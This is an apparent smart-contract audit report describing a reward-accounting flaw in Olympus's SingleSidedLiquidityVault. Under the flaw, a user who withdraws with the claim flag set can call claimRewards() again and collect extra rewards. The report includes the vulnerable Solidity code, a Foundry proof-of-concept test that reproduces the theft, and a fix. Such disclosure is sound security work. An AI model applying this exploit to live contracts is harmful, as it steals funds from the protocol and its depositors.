CRYP70

high

# Users can steal additional rewards after withdrawing with the `claimed_` flag set as `true`

## Summary
The `SingleSidedLiquidityVault` allows for users to deposit and withdraw `wstETH` tokens in order to accumulate rewards over a period of time. Internal rewards are gathered based on a `rewardsPerSecond_` basis while external rewards are determined by the third party external contract. When withdrawing, users will have the option to claim rewards on withdrawal by passing `true` to the `claimed_` boolean flag to the `withdraw()` function making this a gas efficient method to return both `wstETH` tokens and rewarding users their share however, the withdrawal function does not appropriately update the state of rewards when a user attempts to pass the `claimed_` flag. 

## Vulnerability Detail
The function `_withdrawUpdateRewardState()` is called on withdrawal on line `263` and is responsible for updating both internal and external reward state and transferring those earned rewards to the users. The code for this function looks like the following:

```solidity
function _withdrawUpdateRewardState(uint256 lpAmount_, bool claim_) internal {
        uint256 numInternalRewardTokens = internalRewardTokens.length;
        uint256 numExternalRewardTokens = externalRewardTokens.length;

        // Handles accounting logic for internal and external rewards, harvests external rewards
        uint256[] memory accumulatedInternalRewards = _accumulateInternalRewards();
        uint256[] memory accumulatedExternalRewards = _accumulateExternalRewards();

        for (uint256 i; i < numInternalRewardTokens; ) {
            _updateInternalRewardState(i, accumulatedInternalRewards[i]);
            if (claim_) _claimInternalRewards(i);

            // Update reward debts so as to not understate the amount of rewards owed to the user, and push
            // any unclaimed rewards to the user's reward debt so that they can be claimed later
            InternalRewardToken memory rewardToken = internalRewardTokens[i];
            uint256 rewardDebtDiff = lpAmount_ * rewardToken.accumulatedRewardsPerShare;

            if (rewardDebtDiff > userRewardDebts[msg.sender][rewardToken.token]) {
                userRewardDebts[msg.sender][rewardToken.token] = 0;
                cachedUserRewards[msg.sender][rewardToken.token] +=
                    rewardDebtDiff -
                    userRewardDebts[msg.sender][rewardToken.token];
            } else {
                userRewardDebts[msg.sender][rewardToken.token] -= rewardDebtDiff;
            }

            unchecked {
                ++i;
            }
        }

        for (uint256 i; i < numExternalRewardTokens; ) {
            _updateExternalRewardState(i, accumulatedExternalRewards[i]);
            if (claim_) _claimExternalRewards(i);

            // Update reward debts so as to not understate the amount of rewards owed to the user, and push
            // any unclaimed rewards to the user's reward debt so that they can be claimed later
            ExternalRewardToken memory rewardToken = externalRewardTokens[i];
            uint256 rewardDebtDiff = lpAmount_ * rewardToken.accumulatedRewardsPerShare;

            if (rewardDebtDiff > userRewardDebts[msg.sender][rewardToken.token]) {
                userRewardDebts[msg.sender][rewardToken.token] = 0;
                cachedUserRewards[msg.sender][rewardToken.token] +=
                    rewardDebtDiff -
                    userRewardDebts[msg.sender][rewardToken.token];
            } else {
                userRewardDebts[msg.sender][rewardToken.token] -= rewardDebtDiff;
            }

            unchecked {
                ++i;
            }
        }
    }
```

The root of the issue lies on lines `575` and `598` when the contract attempts to update the rewards state because the state is updated before the user attempts to collect their rewards. As a result, when a user attempts to claim rewards, the contract only retains the state before reward tokens were issued. 


## Impact

Should a user attempt to collect rewards from the protocol using the `claimed_` flag set as `true`, an outdated state will create a situation where the contract thinks the user still has outstanding rewards even though the user has already received reward tokens and has burned their LP. This will allow the user to steal reward tokens by calling `claimRewards()` to receive an additional payout of tokens even though they have no LP. The proof of concept below outlines this scenario:

*Proof of concept*
```solidity
    function testClaimAfterWithdraw() public {

        // Setup scenario
        SingleSidedLiquidityVault.InternalRewardToken[] memory internalRewardsTokens = liquidityVault.getInternalRewardTokens();
        SingleSidedLiquidityVault.ExternalRewardToken[] memory externalRewardsTokens = liquidityVault.getExternalRewardTokens();

        ERC20 lidoRewards = ERC20(address(internalRewardsTokens[0].token)); // LIDO DAO Governance Token
        ERC20 externalRewards = ERC20(address(externalRewardsTokens[0].token));

        // Assert Alice's original wsteth balance - Note /1e18 for wsteth assertions for readability
        assertEq(wsteth.balanceOf(address(alice))/1e18, 67);


        // Begin scenario - alice stakes in the vault
        vm.startPrank(address(alice));
        wsteth.approve(address(liquidityVault), 1 ether);
        liquidityVault.deposit(1 ether, 100);
        vm.stopPrank();


        // Assert that Alice's wsteth was successfully transferred to the vault
        assertEq(wsteth.balanceOf(address(alice))/1e18, 66);


        // Move timestamp forward to get some additional rewards
        vm.warp(block.timestamp + (60 * 60 * 12));


        vm.startPrank(address(alice));
        uint256[] memory minout = new uint256[](2);
        minout[0] = 100;
        minout[1] = 100;
        uint256 alicesLp = liquidityVault.lpPositions(address(alice));
        liquidityVault.withdraw(alicesLp, minout, true); // Note: Alice is claiming on withdrawing
        vm.stopPrank();

        // Assert alice's balance was transferred back successfully 
        assertEq(wsteth.balanceOf(address(alice))/1e18, 67);

        // Assert rewards have been claimed successfully - this is okay.
        assertEq(lidoRewards.balanceOf(address(alice))/1e18, 129); // 129.0 ether
        assertEq(externalRewards.balanceOf(address(alice))/1e17, 9); // 0.9 ether

        // Assert alice doesnt have any LP - at this point alice is out of the protocol.
        assertEq(liquidityVault.lpPositions(address(alice)), 0);


        // Timestamp is moved forward again 
        vm.warp(block.timestamp + (60 * 60 * 12));


        vm.startPrank(address(alice));
        // Alice claims again and exploits this issue for extra rewards
        liquidityVault.claimRewards();
        vm.stopPrank();


        // Assert alice has more rewards without LP
        assertEq(lidoRewards.balanceOf(address(alice))/1e18, 259); // 259.0 ether
        assertEq(externalRewards.balanceOf(address(alice))/1e17, 19); // 1.9 ether


    }
```


## Code Snippet
- https://github.com/sherlock-audit/2023-02-olympus/blob/main/src/policies/lending/abstracts/SingleSidedLiquidityVault.sol#L575-L576
- https://github.com/sherlock-audit/2023-02-olympus/blob/main/src/policies/lending/abstracts/SingleSidedLiquidityVault.sol#L598-L599



## Tool used

Manual Review

## Recommendation
It's recommended that the `_withdrawUpdateRewardState()` function updates the reward state `after` reward tokens have been distributed. This will prevent attackers from claiming rewards again after withdrawing from the protocol. 